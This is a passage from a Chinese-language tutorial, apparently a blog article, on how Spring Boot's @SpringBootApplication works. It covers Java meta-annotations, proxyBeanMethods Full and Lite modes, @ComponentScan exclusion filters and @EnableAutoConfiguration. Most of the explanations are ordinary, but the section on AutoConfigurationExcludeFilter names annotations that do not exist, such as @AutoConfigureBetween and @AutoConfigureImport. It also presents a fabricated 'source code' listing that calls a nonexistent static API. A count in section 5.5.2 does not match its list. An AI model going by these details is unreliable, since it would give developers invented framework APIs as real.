<li><strong>@SpringBootConfiguration</strong>：标识配置类</li>
<li><strong>@EnableAutoConfiguration</strong>：启用自动配置</li>
<li><strong>@ComponentScan</strong>：组件扫描</li>
</ol>
<h2 data-id="heading-4">三、Java 元注解基础</h2>
<p>在深入解析 Spring Boot 注解之前，需要先理解 Java 的四个原生元注解，它们是所有注解的基础。</p>
<h3 data-id="heading-5">3.1 @Target 注解</h3>
<p><strong>作用</strong>：限制「被标注的注解」能作用的位置（如类、方法、参数等）</p>
<p><strong>取值</strong>：<code>ElementType</code> 枚举，常用值：</p>
<ul>
<li><strong>TYPE</strong>：类、接口、枚举</li>
<li><strong>METHOD</strong>：方法</li>
<li><strong>FIELD</strong>：成员变量</li>
<li><strong>PARAMETER</strong>：方法参数</li>
<li><strong>CONSTRUCTOR</strong>：构造器</li>
<li><strong>ANNOTATION_TYPE</strong>：其他注解（元注解的元注解）</li>
</ul>
<p><strong>源码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Target {
    ElementType[] value();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ElementType</span> {
    TYPE,           <span class="hljs-comment">// 类、接口、枚举</span>
    FIELD,          <span class="hljs-comment">// 字段</span>
    METHOD,         <span class="hljs-comment">// 方法</span>
    PARAMETER,      <span class="hljs-comment">// 参数</span>
    CONSTRUCTOR,    <span class="hljs-comment">// 构造器</span>
    LOCAL_VARIABLE, <span class="hljs-comment">// 局部变量</span>
    ANNOTATION_TYPE,<span class="hljs-comment">// 注解</span>
    PACKAGE,        <span class="hljs-comment">// 包</span>
    TYPE_PARAMETER, <span class="hljs-comment">// 类型参数（Java 8+）</span>
    TYPE_USE        <span class="hljs-comment">// 类型使用（Java 8+）</span>
}
</code></pre>
<h3 data-id="heading-6">3.2 @Retention 注解</h3>
<p><strong>作用</strong>：定义「被标注的注解」的保留周期（即注解在什么阶段存在）</p>
<p><strong>取值</strong>：<code>RetentionPolicy</code> 枚举（优先级：SOURCE &lt; CLASS &lt; RUNTIME）：</p>
<ul>
<li><strong>SOURCE</strong>：仅源码阶段存在，编译后消失（如 <code>@Override</code>）</li>
<li><strong>CLASS</strong>：编译后保留在 <code>.class</code> 文件中，运行时不加载（默认值）</li>
<li><strong>RUNTIME</strong>：保留到运行时，可通过反射获取（如 Spring 注解）</li>
</ul>
<p><strong>源码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Retention {
    RetentionPolicy <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">RetentionPolicy</span> {
    SOURCE,    <span class="hljs-comment">// 源码阶段</span>
    CLASS,     <span class="hljs-comment">// 类文件阶段</span>
    RUNTIME    <span class="hljs-comment">// 运行时阶段</span>
}
</code></pre>
<h3 data-id="heading-7">3.3 @Documented 注解</h3>
<p><strong>作用</strong>：当一个注解被 <code>@Documented</code> 标注时，该注解的使用信息会被 Javadoc 工具提取并生成到 API 文档中；若不加 <code>@Documented</code>，Javadoc 会忽略该注解的存在。</p>
<p><strong>源码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Documented {
}
</code></pre>
<h3 data-id="heading-8">3.4 @Inherited 注解</h3>
<p><strong>作用</strong>：允许「被标注的注解」被子类继承（仅作用于类级注解）</p>
<p><strong>注意限制</strong>：</p>
<ol>
<li>仅对 <code>@Target(ElementType.TYPE)</code> 的注解有效（方法/字段的注解不继承）</li>
<li>子类仅继承"父类的类级注解"，不继承父接口的注解</li>
</ol>
<p><strong>源码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Inherited {
}
</code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Inherited</span>
<span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyAnnotation {
}

<span class="hljs-meta">@MyAnnotation</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
}

<span class="hljs-comment">// Child 类会自动继承 @MyAnnotation 注解</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Parent</span> {
}
</code></pre>
<h2 data-id="heading-9">四、@SpringBootConfiguration 注解详解</h2>
<h3 data-id="heading-10">4.1 注解定义</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration {
    <span class="hljs-meta">@AliasFor(annotation = Configuration.class)</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h3 data-id="heading-11">4.2 核心特性</h3>
<p><code>@SpringBootConfiguration</code> 是 Spring Boot 中特有的注解，是对 Spring 中 <code>@Configuration</code> 注解的拓展。<code>@SpringBootConfiguration</code> 内部承接了 <code>@Configuration</code>，关键的区别是 <code>@SpringBootConfiguration</code> 中有一个特有的参数：<code>boolean proxyBeanMethods</code>，默认的设置为 <code>true</code>。</p>
<h3 data-id="heading-12">4.3 proxyBeanMethods 参数详解</h3>
<p><code>proxyBeanMethods</code> 是布尔类型（默认值 <code>true</code>），取值决定 <code>@SpringBootConfiguration</code> 标注的配置类的工作模式：</p>
<h4 data-id="heading-13">4.3.1 Full 模式（proxyBeanMethods = true）</h4>
<p><strong>特点</strong>：Spring 会为配置类生成 CGLIB 动态代理，<code>@Bean</code> 方法的调用会被代理拦截，确保每次调用都返回容器中已存在的单例 Bean（而非新创建实例）。</p>
<p><strong>工作原理</strong>：</p>
<ul>
<li>Spring 使用 CGLIB 为配置类创建代理对象</li>
<li>当调用 <code>@Bean</code> 方法时，代理会拦截调用</li>
<li>检查容器中是否已存在该 Bean，存在则返回，不存在则创建并注册</li>
</ul>
<p><strong>示例代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootConfiguration(proxyBeanMethods = true)</span> <span class="hljs-comment">// 默认就是true，可省略</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> {
    <span class="hljs-comment">// 定义Bean1</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"张三"</span>, <span class="hljs-number">20</span>);
    }

    <span class="hljs-comment">// 定义Bean2，依赖Bean1</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">order</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 直接调用本类的user()方法</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(user()); <span class="hljs-comment">// 实际返回容器中的单例User，而非新创建</span>
    }
}

<span class="hljs-comment">// 测试：从容器中获取Bean</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(DemoApplication.class, args);
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> context.getBean(User.class);
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> context.getBean(Order.class);
        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> order.getUser();
        
        System.out.println(user1 == user2); <span class="hljs-comment">// true（同一单例实例）</span>
    }
}
</code></pre>
<h4 data-id="heading-14">4.3.2 Lite 模式（proxyBeanMethods = false）</h4>
<p><strong>特点</strong>：Spring 不会为配置类生成代理，<code>@Bean</code> 方法直接执行并返回新实例，容器仅负责注册 Bean（单例性由容器维护，但直接调用方法会绕开容器）。</p>
<p><strong>工作原理</strong>：</p>
<ul>
<li>配置类不会被代理，直接使用原始类</li>
<li>调用 <code>@Bean</code> 方法时，直接执行方法体，创建新实例</li>
<li>容器中注册的 Bean 仍然是单例（通过容器获取时）</li>
</ul>
<p><strong>示例代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootConfiguration(proxyBeanMethods = false)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"张三"</span>, <span class="hljs-number">20</span>);
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">order</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(user()); <span class="hljs-comment">// 直接调用方法，返回新的User实例（非容器单例）</span>
    }
}

<span class="hljs-comment">// 测试</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(DemoApplication.class, args);
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> context.getBean(User.class); <span class="hljs-comment">// 容器维护的单例</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> context.getBean(Order.class);
        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> order.getUser(); <span class="hljs-comment">// 从Order中获取的是新实例（非容器单例）</span>
        
        System.out.println(user1 == user2); <span class="hljs-comment">// false（两个不同实例）</span>
    }
}
</code></pre>
<h4 data-id="heading-15">4.3.3 两种模式的区别</h4>
<p><strong>关键理解</strong>：</p>
<ul>
<li><strong>Full 模式</strong>：直接调用 <code>@Bean</code> 修饰的方法，也是从 Bean 容器中找到对应的 Bean 返回</li>
<li><strong>Lite 模式</strong>：直接创建一个新的实例，同时在 Bean 容器中，对应的 Bean 还是单例模式</li>
</ul>
<p><strong>困惑解答</strong>：那跟非单例模式有什么区别？</p>
<p><strong>答案</strong>：单例特指的是在容器中获取 Bean 永远是这个 Bean，容器外部不属于单例模式的范围。也就是说：</p>
<ul>
<li>通过容器获取的 Bean（<code>context.getBean()</code>）始终是单例</li>
<li>但在 Lite 模式下，配置类内部直接调用 <code>@Bean</code> 方法会创建新实例，绕过了容器</li>
</ul>
<h4 data-id="heading-16">4.3.4 @Configuration 源码分析</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Configuration {
    <span class="hljs-meta">@AliasFor(annotation = Component.class)</span>
    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">""</span>;
    
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>@Configuration</code> 本身也是 <code>@Component</code> 的派生注解</li>
<li><code>proxyBeanMethods</code> 参数控制是否使用代理模式</li>
<li>Spring 通过 <code>ConfigurationClassPostProcessor</code> 处理配置类</li>
</ul>
<h2 data-id="heading-17">五、@ComponentScan 注解详解</h2>
<h3 data-id="heading-18">5.1 注解定义</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Repeatable(ComponentScans.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> ComponentScan {
    <span class="hljs-meta">@AliasFor("basePackages")</span>
    String[] value() <span class="hljs-keyword">default</span> {};
    
    <span class="hljs-meta">@AliasFor("value")</span>
    String[] basePackages() <span class="hljs-keyword">default</span> {};
    
    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> {};
    
    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BeanNameGenerator</span>&gt; nameGenerator() <span class="hljs-keyword">default</span> BeanNameGenerator.class;
    
    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScopeMetadataResolver</span>&gt; scopeResolver() <span class="hljs-keyword">default</span> AnnotationScopeMetadataResolver.class;
    
    ScopedProxyMode <span class="hljs-title function_">scopedProxy</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> ScopedProxyMode.DEFAULT;
    
    String <span class="hljs-title function_">resourcePattern</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">"**/*.class"</span>;
    
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">useDefaultFilters</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;
    
    ComponentScan.Filter[] includeFilters() <span class="hljs-keyword">default</span> {};
    
    ComponentScan.Filter[] excludeFilters() <span class="hljs-keyword">default</span> {};
    
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">lazyInit</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h3 data-id="heading-19">5.2 @AliasFor 注解</h3>
<p><strong>作用</strong>：<code>@AliasFor</code> 重定向，作用是指明两个参数的作用是一致的，可以互相替换。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@AliasFor("basePackages")</span>
String[] value() <span class="hljs-keyword">default</span> {};

<span class="hljs-meta">@AliasFor("value")</span>
String[] basePackages() <span class="hljs-keyword">default</span> {};
</code></pre>
<p>使用参数 <code>basePackages</code> 设置扫描路径和使用 <code>value</code> 设置的效果是一样的，选一个来使用。</p>
<p><strong>源码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AliasFor {
    <span class="hljs-meta">@AliasFor("attribute")</span>
    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">""</span>;
    
    <span class="hljs-meta">@AliasFor("value")</span>
    String <span class="hljs-title function_">attribute</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">""</span>;
    
    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; annotation() <span class="hljs-keyword">default</span> Annotation.class;
}
</code></pre>
<h3 data-id="heading-20">5.3 @ComponentScan 核心作用</h3>
<h4 data-id="heading-21">5.3.1 扫描指定的包路径</h4>
<ul>
<li>在没有明确指定的前提下，默认是当前启动类所在的包路径，以及该包的所有子包</li>
<li>可以通过 <code>basePackages</code> 或 <code>basePackageClasses</code> 指定扫描路径</li>
</ul>
<h4 data-id="heading-22">5.3.2 注册 Bean</h4>
<p>将扫描包下的所有类中带有 <code>@Component</code>（包括衍生注解 <code>@Service</code>、<code>@Controller</code>、<code>@Repository</code> 等）注解的所有类注册为 Bean，由 Spring 容器进行管理。</p>
<h4 data-id="heading-23">5.3.3 支持过滤规则</h4>
<p>能够通过 <code>includeFilter</code>（包含指定的类）和 <code>excludeFilter</code>（过滤指定的类）进行过滤。</p>
<h3 data-id="heading-24">5.4 @SpringBootApplication 中的过滤配置</h3>
<p><code>@SpringBootApplication</code> 内部负载的 <code>@ComponentScan</code> 注解默认配置两个过滤类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ComponentScan(
    excludeFilters = {
        @Filter(
            type = FilterType.CUSTOM,
            classes = {TypeExcludeFilter.class}
        ),
        @Filter(
            type = FilterType.CUSTOM,
            classes = {AutoConfigurationExcludeFilter.class}
        )
    }
)</span>
</code></pre>
<p>这是 Spring Boot 对「默认扫描规则」的补充——明确排除两类特殊类，避免它们被 <code>@ComponentScan</code> 误扫描并重复注册。</p>
<h3 data-id="heading-25">5.5 TypeExcludeFilter 详解</h3>
<h4 data-id="heading-26">5.5.1 核心作用</h4>
<p>提供开发者自定义排除逻辑的扩展点：允许通过代码（或配置）指定「不需要被 <code>@ComponentScan</code> 扫描注册的类」，Spring Boot 会自动委托该 Filter 执行排除逻辑。</p>
<h4 data-id="heading-27">5.5.2 工作原理</h4>
<p><code>TypeExcludeFilter</code> 是 Spring Boot 提供的「空实现基础类」，本身不包含固定排除规则，核心价值是「预留扩展接口」。</p>
<p>开发者可通过两种方式扩展其过滤逻辑：</p>
<ol>
<li>手动实现 <code>TypeExcludeFilter</code> 子类，重写 <code>match()</code> 方法定义排除规则</li>
<li>通过 <code>SpringApplication.addTypeExcludeFilter(TypeExcludeFilter filter)</code> 动态添加排除规则</li>
<li>在 <code>META-INF/spring.factories</code> 中配置自定义 <code>TypeExcludeFilter</code> 实现类（自动加载）</li>
</ol>
<h4 data-id="heading-28">5.5.3 源码分析</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeExcludeFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeFilter</span>, BeanFactoryAware {
    <span class="hljs-keyword">private</span> BeanFactory beanFactory;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBeanFactory</span><span class="hljs-params">(BeanFactory beanFactory)</span> <span class="hljs-keyword">throws</span> BeansException {
        <span class="hljs-built_in">this</span>.beanFactory = beanFactory;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">match</span><span class="hljs-params">(MetadataReader metadataReader, MetadataReaderFactory metadataReaderFactory)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.beanFactory <span class="hljs-keyword">instanceof</span> ListableBeanFactory &amp;&amp; getClass() == TypeExcludeFilter.class) {
            <span class="hljs-comment">// 从容器中获取所有 TypeExcludeFilter 类型的 Bean</span>
            Collection&lt;TypeExcludeFilter&gt; delegates = ((ListableBeanFactory) <span class="hljs-built_in">this</span>.beanFactory)
                .getBeansOfType(TypeExcludeFilter.class).values();
            <span class="hljs-keyword">for</span> (TypeExcludeFilter delegate : delegates) {
                <span class="hljs-keyword">if</span> (delegate.match(metadataReader, metadataReaderFactory)) {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h4 data-id="heading-29">5.5.4 自定义示例</h4>
<p>假设需要排除所有带有 <code>@Deprecated</code> 注解的类，不注册为 Bean：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 自定义 TypeExcludeFilter 实现类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeprecatedExcludeFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TypeExcludeFilter</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">match</span><span class="hljs-params">(MetadataReader metadataReader, MetadataReaderFactory metadataReaderFactory)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 逻辑：如果类上有 @Deprecated 注解，返回 true（表示排除）</span>
        <span class="hljs-keyword">return</span> metadataReader.getAnnotationMetadata().hasAnnotation(Deprecated.class.getName());
    }
}

<span class="hljs-comment">// 2. 启动类中添加该过滤规则</span>
<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">SpringApplication</span> <span class="hljs-variable">application</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplication</span>(DemoApplication.class);
        <span class="hljs-comment">// 添加自定义排除规则</span>
        application.addTypeExcludeFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DeprecatedExcludeFilter</span>());
        application.run(args);
    }
}
</code></pre>
<p><strong>效果</strong>：所有带 <code>@Deprecated</code> 的类，即使在扫描路径下，也不会被 <code>@ComponentScan</code> 注册为 Bean。</p>
<p><strong>核心价值</strong>：Spring Boot 不限制开发者的排除需求，通过 <code>TypeExcludeFilter</code> 预留了「灵活扩展」的入口，满足复杂场景下的自定义扫描规则。</p>
<h3 data-id="heading-30">5.6 AutoConfigurationExcludeFilter 详解</h3>
<h4 data-id="heading-31">5.6.1 核心作用</h4>
<p>排除 Spring Boot 的「自动配置类」，避免其被 <code>@ComponentScan</code> 误扫描并重复注册——这是 Spring Boot 自动配置机制的关键保障。</p>
<h4 data-id="heading-32">5.6.2 关键前提：自动配置类的加载逻辑</h4>
<p>Spring Boot 的自动配置类（如 <code>DataSourceAutoConfiguration</code>、<code>WebMvcAutoConfiguration</code>），其加载方式不是 <code>@ComponentScan</code> 扫描，而是通过：</p>
<ol>
<li><code>@EnableAutoConfiguration</code> 注解触发</li>
<li>读取 <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> 文件（Spring Boot 2.7+ 版本）</li>
<li>按需加载对应的自动配置类，注册为 Bean</li>
</ol>
<p>这些自动配置类本身可能带有 <code>@Configuration</code> 注解（属于 <code>@Component</code> 的派生注解），如果不排除，会被 <code>@ComponentScan</code> 扫描到并「重复注册」——导致 Bean 冲突、配置覆盖等问题。</p>
<h4 data-id="heading-33">5.6.3 工作原理</h4>
<p><code>AutoConfigurationExcludeFilter</code> 会排除哪些类？</p>
<p>该 Filter 的 <code>match()</code> 方法会判断类是否满足以下条件，满足则排除（返回 <code>true</code>）：</p>
<ol>
<li>类上带有「自动配置相关注解」：<code>@AutoConfigureBefore</code>、<code>@AutoConfigureAfter</code>、<code>@AutoConfigureBetween</code>、<code>@AutoConfigureOrder</code>、<code>@AutoConfigureImport</code></li>
<li>类属于 Spring Boot 自动配置类的「默认路径」（<code>org.springframework.boot.autoconfigure</code> 及其子包）</li>
<li>类被包含在「自动配置类清单」中（即 <code>AutoConfiguration.imports</code> 文件中声明的类）</li>
</ol>
<p>简单说：所有 Spring Boot 官方的自动配置类，都会被这个 Filter 排除，不参与 <code>@ComponentScan</code> 的扫描注册。</p>
<h4 data-id="heading-34">5.6.4 源码分析</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoConfigurationExcludeFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeFilter</span>, BeanClassLoaderAware {
    <span class="hljs-keyword">private</span> ClassLoader beanClassLoader;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> AutoConfigurationMetadata autoConfigurationMetadata;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBeanClassLoader</span><span class="hljs-params">(ClassLoader classLoader)</span> {
        <span class="hljs-built_in">this</span>.beanClassLoader = classLoader;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">match</span><span class="hljs-params">(MetadataReader metadataReader, MetadataReaderFactory metadataReaderFactory)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">return</span> isConfiguration(metadataReader) &amp;&amp; isAutoConfiguration(metadataReader);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isConfiguration</span><span class="hljs-params">(MetadataReader metadataReader)</span> {
        <span class="hljs-keyword">return</span> metadataReader.getAnnotationMetadata().isAnnotated(Configuration.class.getName());
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAutoConfiguration</span><span class="hljs-params">(MetadataReader metadataReader)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> metadataReader.getClassMetadata().getClassName();
        <span class="hljs-comment">// 检查是否在自动配置类清单中</span>
        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.autoConfigurationMetadata != <span class="hljs-literal">null</span>
            &amp;&amp; <span class="hljs-built_in">this</span>.autoConfigurationMetadata.wasProcessed(className))
            || AutoConfigurationImportSelector.getCandidateConfigurations(metadataReader, metadataReaderFactory) != <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-35">5.6.5 示例：避免自动配置类重复注册</h4>
<p>假设 Spring Boot 的 <code>DataSourceAutoConfiguration</code> 类带有 <code>@Configuration</code> 注解：</p>
<ul>
<li>
<p><strong>如果没有 <code>AutoConfigurationExcludeFilter</code></strong>：<code>@ComponentScan</code> 会扫描到该类（若其路径在扫描范围内），并注册为 Bean；同时 <code>@EnableAutoConfiguration</code> 也会加载它，导致同一个类被注册两次，引发冲突。</p>
</li>
<li>
<p><strong>有了该 Filter</strong>：<code>@ComponentScan</code> 会排除 <code>DataSourceAutoConfiguration</code>，仅由 <code>@EnableAutoConfiguration</code> 按需加载，确保 Bean 唯一。</p>
</li>
</ul>
<h2 data-id="heading-36">六、@EnableAutoConfiguration 注解详解</h2>
<h3 data-id="heading-37">6.1 注解定义</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Inherited</span>
<span class="hljs-meta">@AutoConfigurationPackage</span>
<span class="hljs-meta">@Import(AutoConfigurationImportSelector.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableAutoConfiguration {
    <span class="hljs-type">String</span> <span class="hljs-variable">ENABLE_AUTOCONFIGURATION_EXCLUDE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"spring.autoconfigure.exclude"</span>;
    
    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> {};
    
    String[] excludeName() <span class="hljs-keyword">default</span> {};
}
</code></pre>
<h3 data-id="heading-38">6.2 核心作用</h3>
<p><code>@EnableAutoConfiguration</code> 导入了一个负责自动配置类的选择和加载的关键类：<code>@Import({AutoConfigurationImportSelector.class})</code></p>
<p>Spring Boot 在启动时会通过 <code>AutoConfigurationImportSelector</code> 类来自动配置。这个类会读取 <code>META-INF/spring.factories</code> 文件中指定的自动配置类，然后根据条件决定是否应用它们。</p>
<h3 data-id="heading-39">6.3 AutoConfigurationImportSelector 详解</h3>
<h4 data-id="heading-40">6.3.1 类定义</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoConfigurationImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DeferredImportSelector</span>, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered {
    <span class="hljs-comment">// ...</span>
}
